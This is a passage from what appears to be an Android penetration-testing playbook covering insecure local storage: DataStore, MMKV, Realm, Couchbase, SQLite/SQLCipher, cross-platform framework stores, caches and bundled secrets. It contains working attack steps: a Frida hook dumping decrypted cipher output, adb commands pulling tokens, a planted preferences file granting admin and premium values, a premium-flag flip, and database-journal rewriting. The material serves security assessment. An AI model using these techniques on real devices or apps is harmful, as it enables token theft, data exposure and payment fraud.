Java.perform(function () {
  var KS = Java.use('java.security.KeyStore');
  var ks = KS.getInstance('AndroidKeyStore'); ks.load(null);
  var a = ks.aliases(); while (a.hasMoreElements()) console.log('alias:', a.nextElement());
  var C = Java.use('javax.crypto.Cipher');
  C.doFinal.overload('[B').implementation = function (b) {
    var out = this.doFinal(b);
    console.log('[cipher]', this.getAlgorithm(), '->', Java.use('java.lang.String').$new(out));
    return out;
  };
});
```
- **Proof:** The hook printing the plaintext token from a running app on a device whose screen is merely
  unlocked, together with the absence of `setUserAuthenticationRequired` at the key-generation site. For the
  Flutter case specifically: read `FlutterSecureStorage.xml`, retrieve the RSA keypair from the Keystore by
  alias, unwrap the AES key with `RSA/ECB/PKCS1Padding` and decrypt with `AES/CBC/PKCS7Padding`.
- **Escalation:** -> D12 (key management), -> D13 (the decrypted refresh token forges a session), -> D21 if
  the app also claims RASP prevents exactly this.
- **Ruled out when:** The `KeyGenParameterSpec` sets `setUserAuthenticationRequired(true)` with a validity
  window of 0 or a `CryptoObject`-bound `BiometricPrompt`, and the Frida decrypt attempt fails with
  `UserNotAuthenticatedException` — paste that exception, it is the cleanest negative in the chapter.

### D11-014 · Jetpack DataStore `.preferences_pb` and Proto DataStore without a secure serializer

| | |
|---|---|
| **Severity ceiling** | Low standalone; rated on the reader |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) |
| **Attacker** | AM-03 with a reach primitive |
| **Applies to** | apps using `androidx.datastore` |
| **Maps to** | MASTG-TEST-0306 (**status: placeholder** — no published procedure), MASTG-KNOW-0142, MASWE-0001 |

- **Test:** DataStore is the modern replacement for SharedPreferences and is *not* encrypted by default. Its
  files live in `files/datastore/*.preferences_pb` (Preferences DataStore) or a custom path (Proto
  DataStore), so a `shared_prefs/`-only sweep misses them entirely. MASTG-TEST-0306 is a placeholder with no
  method — the note states the intent is to confirm "absence of secure serializers", so supply the procedure
  yourself.
- **How:**
```bash
grep -rn 'PreferenceDataStoreFactory\|DataStoreFactory\|preferencesDataStore(\|dataStore(' out/sources/ -A6
grep -rn 'Serializer<' out/sources/ | grep -iE 'crypt|cipher|aead'     # absence is the point
adb shell run-as $PKG find . -name '*.preferences_pb' -o -name '*.pb'
adb exec-out run-as $PKG cat files/datastore/settings.preferences_pb | strings
adb exec-out run-as $PKG cat files/datastore/settings.preferences_pb | protoc --decode_raw 2>/dev/null
```
- **Proof:** Readable strings (or a `protoc --decode_raw` dump) from the `.preferences_pb` containing a
  token, a user id or a trust flag, with the `preferencesDataStore(name = ...)` declaration that created it.
- **Escalation:** -> D11-056 if any key in it is a control-plane value; -> D13 for credentials.
- **Ruled out when:** Every DataStore is built with a serializer that wraps `EncryptedFile`/Tink, or the
  store contains only UI state (theme, last tab, sort order) after a fully exercised authenticated session.
  Cite MASTG-TEST-0306's placeholder status so the reader knows why no test id backs the procedure.

### D11-015 · MMKV stores — enumerate them, and check the version for the logged-key CVE

| | |
|---|---|
| **Severity ceiling** | Low standalone; Medium–High where the encryption key is recoverable |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the logged key |
| **Attacker** | AM-03 with a reach primitive; AM-04 for the logcat path on older builds |
| **Maps to** | **CVE-2024-21668** — `react-native-mmkv` on Android **before 2.11.0** logged the optional encryption key to Android logs; fixed in 2.11.0 |
| **Applies to** | apps bundling Tencent MMKV or `react-native-mmkv` |

- **Test:** MMKV keeps its files under `files/mmkv/` (one file per instance plus a `.crc`), not in
  `databases/` or `shared_prefs/`. It is unencrypted unless an instance is created with a crypt key — and on
  `react-native-mmkv` below 2.11.0 that key was written to logcat, which turns an "encrypted" store into a
  plaintext one for anyone who can read the log.
- **How:**
```bash
adb shell run-as $PKG ls -la files/mmkv/
adb exec-out run-as $PKG cat files/mmkv/mmkv.default > mmkv.default && strings mmkv.default | grep -iE 'token|bearer|eyJ|user|pin'
grep -rn 'MMKV\.\|mmkvWithID\|initialize(\|cryptKey' out/sources/
grep -rn 'react-native-mmkv' package.json assets/index.android.bundle 2>/dev/null
# the CVE path
adb logcat -d | grep -iE 'mmkv.*key|encryption key'
```
- **Proof:** Readable key/value pairs recovered with `strings` from `files/mmkv/*`, or — for the CVE — the
  encryption key printed in logcat alongside the version string proving `< 2.11.0`.
- **Escalation:** -> D19 (the RN dependency version is a supply-chain finding in its own right), -> D20 for
  the logcat reachability argument, -> D13 for whatever the store held.
- **Ruled out when:** `files/mmkv/` does not exist after a full authenticated session, or every instance is
  created with a `cryptKey` derived from a Keystore key **and** the bundled `react-native-mmkv` is >= 2.11.0
  (state the version you read from `package.json` or the bundle).

### D11-016 · Realm database left unencrypted

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High with a reach primitive and PII/credentials |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the data class |
| **Attacker** | AM-03 with a reach primitive |
| **Applies to** | apps using `io.realm` |
| **Maps to** | MASTG-KNOW-0040 (Realm Databases), MASWE-0001, CWE-312 |

- **Test:** Realm is invisible to every SQLite tool and is omitted by most checklists. By default the file is
  named `default` with extension `realm` and lives in `files/`. `RealmConfiguration.encryptionKey()` is
  optional; when absent the file opens in Realm Browser with no key at all.
- **How:**
```bash
adb shell run-as $PKG ls -la files/*.realm files/*.realm.lock files/*.realm.management 2>/dev/null
adb exec-out run-as $PKG cat files/default.realm > default.realm
grep -rn 'io\.realm\|RealmConfiguration\|encryptionKey(\|Realm\.getInstance' out/sources/ -A6
strings default.realm | grep -iE 'token|bearer|@|passw|card|[0-9]{10,}' | head -40
```
  Open it with the Realm Browser (`github.com/realm/realm-browser-osx`) for a screenshot-quality artefact.
- **Proof:** The Realm Browser opening the pulled file without a key and rendering user records, or the
  `strings` output with the PII visible.
- **Escalation:** If `encryptionKey()` **is** used, do not stop — attack the key source in D12 (a constant, a
  `ANDROID_ID` derivation and a Keystore-wrapped key are three completely different findings).
- **Ruled out when:** No `.realm` file exists after a fully exercised session, or every
  `RealmConfiguration.Builder` calls `encryptionKey()` with bytes that originate from `AndroidKeyStore` and
  the pulled file fails to open unkeyed — show the Realm Browser's error.

### D11-017 · Couchbase Lite `.cblite` — the contents are plain JSON

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High with a reach primitive |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) |
| **Attacker** | AM-03 with a reach primitive |
| **Applies to** | apps using Couchbase Lite (common in retail, field-service and offline-first apps) |
| **Maps to** | mechanism (observed; no external identifier) |

- **Test:** `.cblite`/`.cblite2` files (with their `-wal` and `-shm` siblings) sit in `files/`, outside every
  directory a standard sweep visits, and their document bodies are stored as readable JSON. No database
  client is required to loot them — `strings` is enough, which is exactly why they are worth naming
  explicitly in a report.
- **How:**
```bash
adb shell run-as $PKG find . -iname '*.cblite*' -o -iname '*.cblite2' | tee cblite.txt
adb exec-out run-as $PKG cat files/db.cblite2/db.sqlite3 > cb.db 2>/dev/null
for f in $(cat cblite.txt); do adb exec-out run-as $PKG cat "$f" > "$(basename "$f")"; done
strings *.cblite* | grep -iE 'pass|token|card|cvv|secret|auth|bearer|eyJ'
grep -rn 'com\.couchbase\|CouchbaseLite\|DatabaseConfiguration\|setEncryptionKey' out/sources/
```
- **Proof:** A JSON document body containing a credential or PII recovered from the `.cblite` with `strings`
  alone, with the file path. The `-wal` sibling frequently holds documents the app believes it deleted.
- **Escalation:** -> D13 for credentials, -> D11-023 if `setEncryptionKey` is present with a literal.
- **Ruled out when:** No `.cblite*` file exists, or `DatabaseConfiguration.setEncryptionKey` is called with
  Keystore-derived bytes and `strings` on the pulled file returns no readable document bodies.

### D11-018 · Locate the cross-platform framework's default store by name, not by guessing

| | |
|---|---|
| **Severity ceiling** | High–Critical, rated on the recovered credential and the reader |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) for the store; file the outcome instead when a token replays |
| **Attacker** | AM-03 with a reach primitive |
| **Applies to** | React Native, Cordova/Capacitor, Flutter, Unity, Xamarin/MAUI apps |
| **Maps to** | MASTG-TECH-0142 (Inspecting WebView Storage) for the Cordova/Capacitor WebView stores |

- **Test:** Each framework has a default key/value store in a predictable file. Because the storage **key
  names** are already in your JS bundle or Dart/IL2CPP string dump, this is a targeted read rather than a
  fishing trip: mine the key names first, then go straight to the file.
- **How:**
```bash
# React Native AsyncStorage (SQLite)
adb exec-out run-as $PKG cat databases/RKStorage > RKStorage.db
sqlite3 RKStorage.db 'select key, substr(value,1,400) from catalystLocalStorage;'
# react-native-mmkv
adb shell run-as $PKG ls -la files/mmkv/
# Capacitor Preferences
adb shell run-as $PKG cat shared_prefs/CapacitorStorage.xml
# Cordova / Capacitor WebView stores
adb shell run-as $PKG ls -laR 'app_webview/Default/Local Storage' app_webview/Default/IndexedDB
# Flutter
adb shell run-as $PKG cat shared_prefs/FlutterSharedPreferences.xml
adb shell run-as $PKG cat shared_prefs/FlutterSecureStorage.xml
# Unity
adb shell run-as $PKG cat "shared_prefs/${PKG}.v2.playerprefs.xml"
# Xamarin / MAUI
adb shell run-as $PKG ls -la shared_prefs/
# cross-reference the key names you already mined from the bundle/snapshot
grep -aiE 'token|jwt|refresh|session|pin|password|card|otp' bundle.strings | sort -u
```
- **Proof:** A JWT, refresh token, PAN or PIN readable in plaintext from the pulled file, **and** that token
  replayed against the API returning the victim's data.
- **Escalation:** -> D19 for the framework-specific delivery primitive (a `_capacitor_file_` read makes the
  same extraction remote rather than local); -> D13/D15 for the token.
- **Ruled out when:** Every framework store listed above is absent or contains only UI state after a full
  authenticated session, and the app's secure-storage plugin is present *and actually called* (D11-009 —
  resolve the JS-name-to-Java-class mapping before writing this negative).

### D11-019 · `MODE_WORLD_READABLE` / `MODE_WORLD_WRITEABLE` and the numeric-mode grep

| | |
|---|---|
| **Severity ceiling** | High for a world-readable credential; Critical for a world-**writable** file the app later trusts |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) for the read; the write side files as the code-execution outcome it produces |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY** — the Java constants throw `SecurityException` from **targetSdk 24**. Still current via `File.setReadable/setWritable`, `chmod` and native `open(..., 0666)` on every version, and files created by an older version of the app persist with the old mode after upgrade. |
| **Maps to** | MASWE-0001, CWE-276; MobSF `android_world_writable` (CWE-276), `android_world_readable`, `android_world_read_write`; mobsfscan `world_readable`, `world_writeable`, `android_kotlin_world_read_write` |

- **Test:** Grep the constants *and the numeric modes* — obfuscated call sites pass `1`, `2` or `3` rather
  than the named constant — then verify the **actual file mode on-device**, because that is the only evidence
  that survives triage. Note the platform reality: even a world-readable DAC bit does not defeat SELinux
  cross-app confinement on modern builds, and Android 11+ blocks reading another app's internal data
  directory outright "even if the target app has made files world-readable (API 27 or lower)".
- **How:**
```bash
grep -rnE 'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE|Context\.MODE_WORLD' out/sources/
grep -rnE 'getSharedPreferences\([^,]+, *[123]\)|openFileOutput\([^,]+, *[123]\)' out/sources/
grep -rnE 'setReadable\(true, *false\)|setWritable\(true, *false\)|chmod\s+7|0777|0666' out/sources/
adb shell run-as $PKG find . -type f -exec stat -c '%A %U %n' {} \; | grep -vE '^-rw-------|^-rw-rw----'
adb shell run-as $PKG find . -perm -o+r -o -perm -o+w
adb shell ls -l /data/data/$PKG 2>&1        # from an unprivileged shell — expect Permission denied on modern builds
```
- **Proof:** `stat` showing e.g. `-rw-rw-rw-` on a file holding a credential **plus** a successful read from
  a *different unprivileged UID* — a second test app, not root, and not `adb shell` (uid 2000 is not a
  third-party app). If the second app is denied by SELinux, say so and drop the claim.
- **Escalation:** World-writable is the worse half: it lets another app rewrite config the app trusts ->
  D17 dynamic code loading; a writable `shared_prefs` directory also enables the `.bak` ghost-file primitive
  (D11-020).
- **Ruled out when:** `targetSdkVersion >= 24` (so the constants would throw), the on-device `stat` sweep
  returns only `0600`/`0660` modes, and a second app's read attempt fails. State the device's
  `ro.build.version.sdk` — this class is dead on Android 11+ regardless of the bits.

### D11-020 · SharedPreferences `.bak` ghost file — convert a create-only write into a settings overwrite

| | |
|---|---|
| **Severity ceiling** | High where the poisoned preference gates authorisation or entitlement; Critical as the step in a code-load chain |
| **VRT** | file the outcome: `broken_authentication_and_session_management.authentication_bypass` (P1) for a role/gate flip, or the D17 code-execution node |
| **Attacker** | AM-03 with an existing directory-write or file-create primitive |
| **Applies to** | all apps that keep an authorisation, entitlement or integrity value in SharedPreferences — verify the rename behaviour empirically on the target API level |
| **Maps to** | `SharedPreferencesImpl` backup-file semantics; Microsoft **Dirty Stream** (the Xiaomi File Manager step that overwrote `com.mi.android.globalFileexprorer_preferences.xml` to defeat a hash check) |

- **Test:** `SharedPreferencesImpl` writes `<name>.xml.bak` and, on the next load, **renames a present `.bak`
  over the live file**. So an attacker who can *create* files in `shared_prefs/` but cannot *overwrite* the
  existing XML still controls preference values — including a stored integrity hash. This is what converts a
  create-only primitive (a zip-slip, a `_display_name` traversal, a Dirty Stream write) into a settings
  overwrite, and it is why "the file already exists, so the traversal is harmless" is wrong.
- **How:**
```bash
adb shell "ls -ld /data/data/$PKG/shared_prefs"       # is the directory writable by anything else?
# plant the replacement (here via run-as; in a real chain via the file-create primitive)
adb shell run-as $PKG sh -c 'cat > shared_prefs/Prefs.xml.bak' <<'XML'
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map><boolean name="is_premium" value="true" /><string name="role">admin</string>
<string name="lib_hash">0000000000000000000000000000000000000000</string></map>
XML
adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
adb shell run-as $PKG cat shared_prefs/Prefs.xml
```
- **Proof:** After the restart, `Prefs.xml` contains the attacker's values and the `.bak` is gone — the
  rename happened silently. Then show the app honouring the injected setting (the gated screen opening, the
  plugin loading).
- **Escalation:** -> D17 when the overwritten value is an integrity hash guarding a `System.load()`;
  -> D23 for an entitlement flip; -> D13 for a role string.
- **Ruled out when:** No primitive writes into `shared_prefs/` (D11-002 all-no), **or** the app reads the
  security-relevant value from a source other than SharedPreferences (server response, Keystore-signed blob)
  — prove that by planting the `.bak`, restarting, observing the live XML change, and observing the app's
  behaviour **not** change.

### D11-021 · Client-side entitlement / premium flag stored locally and trusted

| | |
|---|---|
| **Severity ceiling** | Medium–High (revenue / business logic); rate on the unlocked functionality |
| **VRT** | outcome-rated; many programmes exclude IAP bypass — check the policy first |
| **Attacker** | AM-11 physical unlocked; AM-03 with a write primitive |
| **Applies to** | apps with a paid tier, subscription or unlockable feature that works offline |
| **Maps to** | MASWE-0006; Google Play Billing security guidance ("the less business logic on the device, the more secure") |

- **Test:** Local booleans and strings that gate paid functionality — `premium_status`, `lifetime_purchase`,
  `subscription_type`, `pro_unlocked`, `hasPurchased`. Flip one and see whether the app unlocks with no
  server round-trip that re-validates the entitlement.
- **How:**
```bash
grep -rnE 'is_premium|premium|subscription|lifetime|entitle|pro_|hasPurchased|unlocked' out/sources/ | grep -iE 'getBoolean|putBoolean|getString'
adb shell run-as $PKG cat shared_prefs/*.xml | grep -iE 'premium|subscription|lifetime|entitle|pro_'
adb shell run-as $PKG sh -c "sed -i 's/\"premium_status\" value=\"false\"/\"premium_status\" value=\"true\"/' shared_prefs/app_prefs.xml"
adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
```
- **Proof:** After restart the premium features are live and stay live, with a Burp capture showing **no**
  server request that re-validates the entitlement. Absence of the validating call is the finding, not the
  flag flip.
- **Escalation:** -> D23 (payments/fraud), and via D11-056/J18 the same flag is *restorable* — you do not
  even need a write primitive if it is in the backup set.
- **Ruled out when:** The app re-derives entitlement from the server on every cold start (show the request
  and the server overriding your flip), or Play Billing's `queryPurchasesAsync` is the source of truth and
  the local flag is only a cache the server corrects. Also check the programme scope — several exclude IAP
  bypass entirely, in which case it is out of scope regardless of exploitability.

### D11-022 · Unencrypted SQLite/Room holding PII or session data, plus WAL/journal residue

| | |
|---|---|
| **Severity ceiling** | High; Critical for multi-user PII reachable without privilege |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES, CWE-459) for the residue; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
| **Attacker** | AM-03 with a reach primitive; AM-05 for the post-delete residue |
| **Applies to** | all; MASTG-TEST-0304/0305 are placeholders — the commands below are the working equivalent |
| **Maps to** | MASTG-TEST-0304, MASTG-TEST-0305 (both **status: placeholder**), MASTG-KNOW-0037 (SQLite), MASWE-0001; CVE-2018-11242 (MakeMyTrip 7.2.4, EDB 44690) |

- **Test:** Pull every `.db` and its `-wal`, `-shm` and `-journal` siblings. Two findings live here: the live
  table contents, and the residue in the WAL/journal that survives a row the app believes it deleted — which
  is where "we wiped it on logout / delete-for-everyone" claims fail.
- **How:**
```bash
adb shell run-as $PKG ls -la databases/
adb exec-out run-as $PKG cat databases/app.db > app.db
head -c 16 app.db | xxd        # "SQLite format 3\0" => unencrypted; random bytes => SQLCipher
sqlite3 app.db ".tables" ".schema" "PRAGMA journal_mode;"
sqlite3 app.db "SELECT name,sql FROM sqlite_master;"
adb exec-out run-as $PKG cat databases/app.db-wal > app.db-wal
strings app.db-wal | grep -iE 'token|@|bearer|[0-9]{12,19}'
```
- **Proof:** `file` / `xxd` showing a plain SQLite header, a `.dump` row containing credentials or PII, or —
  for the residue case — `strings app.db-wal` recovering a value the UI says was deleted. For the multi-user
  case, rows belonging to more than one user reachable by an unprivileged attacker is the Critical shape.
- **Escalation:** -> D13 (session rows), -> D20 (mass PII), -> D11-023 if SQLCipher is present, -> D11-024
  for the journal as a *write* primitive.
- **Ruled out when:** `head -c 16` shows non-SQLite bytes and `sqlite3` refuses to open the raw file (i.e.
  SQLCipher is genuinely in use and the key is not decorative — verify with D11-023), **and** the WAL is
  checkpointed/absent after logout. A plain `.tables` failing on an encrypted file is the positive negative;
  paste it.

### D11-023 · Any string argument to `getWritableDatabase()` / SQLCipher with a literal passphrase

| | |
|---|---|
| **Severity ceiling** | High; the DB decrypts to credentials/PII with a key recovered from the APK |
| **VRT** | `insecure_os_firmware.hardcoded_password.non_privileged_user` (**P2**, CWE-259) for the embedded key; `insecure_data_storage...on_internal_storage` (P5) for the data |
| **Attacker** | AM-03 with a reach primitive; the key itself needs only the APK |
| **Applies to** | all apps using SQLCipher / `net.sqlcipher` / Room `SupportFactory` |
| **Maps to** | MASTG-KNOW-0038 (SQLCipher), CWE-321 (Hard-coded Cryptographic Key); Google's "Embedded cryptography secrets" class |

- **Test:** The framework `getWritableDatabase()` / `getReadableDatabase()` overloads take **no** argument.
  SQLCipher's take the passphrase. So *any string argument is the finding*, and a literal there — or a
  trivially reversible derivation (a constant plus `ANDROID_ID`, the package name, a build constant) — makes
  the encryption decorative. Do not stop at the first hit: each `*DBHelper`/`*OpenHelper` can carry a
  different key.
- **How:**
```bash
grep -rn 'getWritableDatabase("' out/sources/
grep -rn 'getReadableDatabase("' out/sources/
grep -rn 'SQLiteDatabase\.loadLibs\|net\.sqlcipher\|SupportFactory\|SupportOpenHelperFactory' out/sources/
grep -rnE 'class .*(DBHelper|OpenHelper|DatabaseHelper)' out/sources/
grep -rn 'ANDROID_ID\|Settings\$Secure;->getString\|getPackageName()' out/sources/   # reversible derivations
```
  Prove impact by **decrypting the pulled DB**, never by asserting it:
```bash
sqlcipher app.db
sqlite> PRAGMA key='havey0us33nmyb@seball';
sqlite> .tables
sqlite> SELECT * FROM users;
```
- **Proof:** `.tables` and a `SELECT` returning real rows using a key recovered purely from the app —
  reproduced offline against the exact ciphertext bytes pulled from the device.
- **Escalation:** -> D12 (key-management finding); -> D13 if session material is in the DB; if the **same key
  is used across builds or environments**, that is `cryptographic_weakness.key_reuse.inter_environment`
  (**P2**). Pre-empt the triager's likely rebuttal: Google's own guidance says embedded secrets are
  "actually fine" in many cases — so anchor the report in the *data the key protects*, not the key alone.
- **Ruled out when:** The passphrase originates from a hardware-backed Keystore key (not a constant, not
  `ANDROID_ID`, not the package name) and your offline decrypt with every APK-derived candidate fails —
  show the failed `PRAGMA key` attempt. "SQLCipher is a dependency" is not proof it is used; confirm the
  `SupportFactory` is actually wired into the Room builder.

### D11-024 · Crafted `*-journal` file to rewrite a database you cannot open

| | |
|---|---|
| **Severity ceiling** | High — integrity compromise of app state via a create-only primitive |
| **VRT** | outcome-rated: `broken_authentication_and_session_management.authentication_bypass` (P1) when it rewrites an auth/entitlement table |
| **Attacker** | AM-03 chained to any arbitrary-file-**create** primitive |
| **Applies to** | all apps using raw SQLite (i.e. almost all; Room does not change the on-disk journal behaviour) |
| **Maps to** | EDB 43189 (Gmail) and EDB 43353 (Outlook for Android), both Project Zero — "It is possible to modify a EmailProviderBody database using this bug by placing a journal file in the databases directory" |

- **Test:** This is the reason an "arbitrary file *create*" primitive (not overwrite) is still High/Critical.
  SQLite replays a hot journal on the next open, so creating `databases/<name>.db-journal` lets you rewrite
  `<name>.db` without ever holding write access to it. Both Project Zero mail bugs note the create-only
  limitation explicitly: "the file can not overwrite an existing file, it has to be a file that doesn't
  already exist" — which the journal technique sidesteps.
- **How:** From any create-only primitive (Dirty Stream, zip-slip, a `_display_name` traversal, a
  `Content-Disposition` traversal), target:
```
/data/data/$PKG/databases/<name>.db-journal
```
  with a hot-journal payload (the EDB entries ship a working base64 blob beginning
  `2dUF+SChY9f/////...` carrying `android_metadata` / `CREATE TABLE` fragments), then restart the app.
- **Proof:** After restart the database content changes, or the app crash-loops on open with
  `SQLiteDatabaseCorruptException` in logcat — the crash itself proves the journal was consumed. For an
  integrity attack, show the target table (auth, entitlement, config) holding your value.
- **Escalation:** -> D13/D23 when the rewritten table gates auth or entitlement; the delivery primitive is a
  D07 traversal, a D11-047 zip-slip or a D11-048 download traversal.
- **Ruled out when:** No arbitrary-file-create primitive reaches `databases/` (D11-002 all-no for write), or
  the app uses WAL mode with `PRAGMA journal_mode=WAL` and no rollback journal is consulted on open — verify
  by planting a malformed `-journal` and observing the app open cleanly and ignore it.

### D11-025 · Device-protected (Direct Boot / DE) storage readable before first unlock

| | |
|---|---|
| **Severity ceiling** | Medium for config; High for a credential, token or PII |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); argue up on the FBE-bypass axis |
| **Attacker** | AM-10 physical locked (pre-unlock code-execution or forensic image); AM-11 |
| **Applies to** | Android 7.0+ (FBE). **LEGACY:** FDE-era devices have no CE/DE split |
| **Maps to** | `source.android.com/docs/security/features/encryption/file-based` (CE "accessible only after the user unlocks"; DE "available both during Direct Boot and after"); AOSP security-model paper §4.4 |

- **Test:** Data written via `createDeviceProtectedStorageContext()` lands in `/data/user_de/<user>/<pkg>/`
  and is decryptable from the moment the device boots, **before any unlock** — outside the lockscreen
  boundary the vendor relies on. Only Credential-Encrypted storage (`/data/user/<user>/<pkg>/`) is protected
  until the user authenticates. An app that caches a token, an API key or a phone number in DE storage to
  work during Direct Boot has moved it out of that boundary.
- **How:**
```bash
grep -rnE 'createDeviceProtectedStorageContext|isDeviceProtectedStorage|moveSharedPreferencesFrom|moveDatabaseFrom|directBootAware' out/sources/ out/AndroidManifest.xml
adb shell run-as $PKG ls -la /data/user_de/0/$PKG/       # DE
adb shell run-as $PKG ls -la /data/user/0/$PKG/          # CE
# the demonstration: reboot, and read BEFORE entering the PIN (rooted test device)
adb reboot && adb wait-for-device
adb shell 'ls -la /data/user_de/0/'"$PKG"'; cat /data/user_de/0/'"$PKG"'/shared_prefs/*.xml'
adb shell dumpsys user | grep -i unlocked
```
- **Proof:** A secret (token, PIN hash, key) present under `/data/user_de/0/<pkg>/` and read from a shell
  taken **before the PIN was entered** — include the `dumpsys user` unlocked=false line or the lock screen
  on a screen recording, and record `getprop ro.crypto.type` (`file` vs `block`).
- **Escalation:** Combine with the D04 `showWhenLocked` item for a complete pre-unlock chain; a stolen locked
  device yields the DE data without the PIN.
- **Ruled out when:** No `createDeviceProtectedStorageContext` / `directBootAware` usage exists and
  `/data/user_de/0/<pkg>/` holds only empty or non-sensitive files, **or** the device is FDE-era
  (`ro.crypto.type=block`) where the CE/DE split does not exist and all data is inaccessible before password
  entry. State which.

### D11-026 · Cache directories retaining authenticated responses and KYC images

| | |
|---|---|
| **Severity ceiling** | Medium–High; High when the cache survives logout and the device is shared/lost |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES) |
| **Attacker** | AM-03 with a reach primitive; AM-05 for cross-account bleed |
| **Applies to** | all; acute on apps with KYC/document scan, chat media, or an HTTP cache |
| **Maps to** | MASTG-KNOW-0042; MASWE-0002; CWE-459 |

- **Test:** Do not stop at `shared_prefs` and `databases`. `cache/`, `code_cache/`, `no_backup/`, the OkHttp
  or Volley HTTP cache, and the Glide/Coil/Picasso image caches routinely hold authenticated response
  bodies, ID documents and card images — and frequently survive logout.
- **How:**
```bash
adb shell run-as $PKG ls -laR cache/ code_cache/ no_backup/ files/
adb exec-out run-as $PKG sh -c 'grep -rl "Bearer \|\"email\"\|\"ssn\"\|\"pan\"" cache/ 2>/dev/null'
adb exec-out run-as $PKG cat cache/http/journal 2>/dev/null | head -40      # OkHttp DiskLruCache index
adb shell run-as $PKG find cache -iname '*.0' -o -iname '*.1'               # OkHttp entry/body pairs
adb shell run-as $PKG ls -laR cache/image_manager_disk_cache 2>/dev/null    # Glide
```
- **Proof:** A cached HTTP response body in `cache/` containing the victim's PII, or a KYC/card image under
  the image-loader cache, readable after logout, with the path.
- **Escalation:** -> D20 (privacy retention); -> D02/D07 for the remote-retrieval path; the cache survives
  logout is also the D11-033 residue finding.
- **Ruled out when:** The HTTP cache stores only non-sensitive assets (verify by grepping the pulled cache
  after an authenticated session), or `Cache-Control: no-store` is honoured for authenticated responses and
  the image cache is cleared on logout — show the empty cache after logout.

### D11-027 · Secrets in app-bundled assets, `res/raw` and generated `strings.xml`

| | |
|---|---|
| **Severity ceiling** | High–Critical depending on the credential |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) when the secret grants access to a public asset; `...for_internal_asset` (P3) otherwise |
| **Attacker** | AM-01 (the APK is public; no device needed) |
| **Applies to** | all |
| **Maps to** | ivrodriguez "Tips for Mobile Bug Bounty Hunting" (search the bundle for non-image files); H1 #351555 (Cloudinary api secret in Android app), H1 #753868 |

- **Test:** This is storage the attacker reads *from the APK*, with no device at all — the closest this
  chapter comes to a P1 on its own. Developers leave test config, private keys and API secrets in `assets/`,
  `res/raw/` and the `strings.xml` derived from `google-services.json`.
- **How:**
```bash
find out/assets out/res/raw -type f | grep -viE '\.(png|jpg|jpeg|webp|gif|ttf|otf|xml|json)$'
grep -rInE '(BEGIN (RSA|EC|OPENSSH) PRIVATE KEY|aws_access_key_id|"private_key"|client_secret|apikey)' out/assets out/res
grep -iE 'google_api_key|google_app_id|firebase|gcm_defaultSenderId' out/res/values/strings.xml
strings -a out/lib/*/*.so classes*.dex | grep -E '^[[:alnum:]]{64}$'      # 64-char keys
strings -a out/lib/*/*.so classes*.dex | grep -E '^[-[:alnum:]]{36}$'     # UUIDs used as keys/salts
```
  Then confirm the constant reaches a live sink: a `SecretKeySpec(<const>.getBytes(), "AES")`, an HMAC key,
  or an authenticating API call.
- **Proof:** Using the extracted secret you decrypt a value the app stored, or forge a signature the backend
  accepts (HTTP 200 on an offline-signed request), or read another user's data via a hardcoded cloud
  credential. **Verify the restriction first** — a Firebase `apiKey` and a package-and-signature-restricted
  Maps key are designed-public and are **not** findings.
- **Escalation:** -> D12 (offline decrypt), -> D18 (third-party API abuse, cloud config), -> D15 (signature
  forgery). If the key signs API requests or protects other users' data, this is the P1 the chapter aims at.
- **Ruled out when:** Every high-entropy string is a designed-public identifier whose restriction you
  verified (package+signature restriction on the console, or documented public status), or the constant
  never reaches a crypto/auth sink. Cite the restriction, not the absence of a grep hit.

### D11-028 · SDK-written token/credential files in app-private storage

| | |
|---|---|
| **Severity ceiling** | High when a long-lived bearer token is recoverable and replayable off-device; Low for a device-scoped analytics id |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); file the replay outcome instead |
| **Attacker** | AM-03 with a reach primitive |
| **Applies to** | all apps embedding social-login, chat, analytics or push SDKs |
| **Maps to** | Oversecured SDK-security post ("SDKs storing user identifiers, device fingerprints, session tokens and telemetry in SharedPreferences or unencrypted SQLite"); historical Facebook SDK v3.15.0 access-token-on-disk case (treat as historical, not a live CVE) |

- **Test:** Find what the *SDK* wrote, not what the app wrote. Exercise the SDK flows (social login, open
  chat, trigger a push) first, then diff the data directory — many SDKs persist their own long-lived
  credentials in plaintext, and the app team never audited them.
- **How:**
```bash
# exercise the SDK flows, then:
adb shell run-as $PKG find . -type f -newermt '-10 minutes' 2>/dev/null
for f in $(adb shell run-as $PKG ls shared_prefs/); do
  echo "== $f"; adb shell run-as $PKG cat shared_prefs/"$f"
done | grep -iE 'token|secret|jwt|refresh|access|password|apikey|"ey[A-Za-z0-9_-]{10,}'
adb shell run-as $PKG ls -la databases/ files/ no_backup/
```
- **Proof:** The SDK file path plus the plaintext token, and a follow-up authenticated API call with that
  token from curl returning the victim's data — that second half converts Low to High.
- **Escalation:** -> D13/D15 (replay; is it device-bound?); -> D18 (the SDK's backend); -> D11-051 (SDK
  files are backed up unless the app explicitly excludes them).
